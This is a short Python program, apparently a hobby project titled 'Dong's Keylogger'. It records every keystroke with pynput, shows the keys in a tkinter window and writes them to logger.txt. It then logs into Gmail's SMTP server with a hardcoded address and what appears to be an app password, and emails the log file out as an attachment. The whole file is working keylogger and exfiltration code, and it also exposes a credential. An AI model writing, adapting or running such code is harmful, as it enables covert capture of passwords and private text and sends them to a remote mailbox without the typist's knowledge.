from tkinter.constants import LEFT, N
from pynput import keyboard
import tkinter
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


with open("logger.txt", "w") as l:
    window = tkinter.Tk()

    count = 0

    window.title("Dong's Keylogger")
    window.geometry('640x400+100+100')

    frame = tkinter.Frame(window)

    scrollbar = tkinter.Scrollbar(frame)
    scrollbar.pack(side="right", fill='y')

    entry = tkinter.Entry(window, width=640)
    entry.pack()
    entry.place(x=0,y=380)

    label = tkinter.Listbox(frame, yscrollcommand=scrollbar.set, width=400, height=20)
    label.pack()

    scrollbar["command"]=label.yview

    def on_press(key):

        global count
        if key == keyboard.Key.esc:
            return False
        print("{}".format(key))
        label.insert(count, key)
        label.see(count)
        l.write(str(key))

        count += 1

    frame.pack()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    window.mainloop()

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login('mjdh1936@gmail.com', 'avgtybdtvdnfptlq')

# 제목, 본문 작성
msg = MIMEMultipart()
msg['Subject'] = '제목'
msg.attach(MIMEText('본문', 'plain'))

# 파일첨부 (파일 미첨부시 생략가능)
attachment = open("logger.txt", 'rb')
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= " + "logger.txt")
msg.attach(part)

# 메일 전송
s.sendmail("mjdh1936@gmail.com", "mjdh1936@gmail.com", msg.as_string())
s.quit()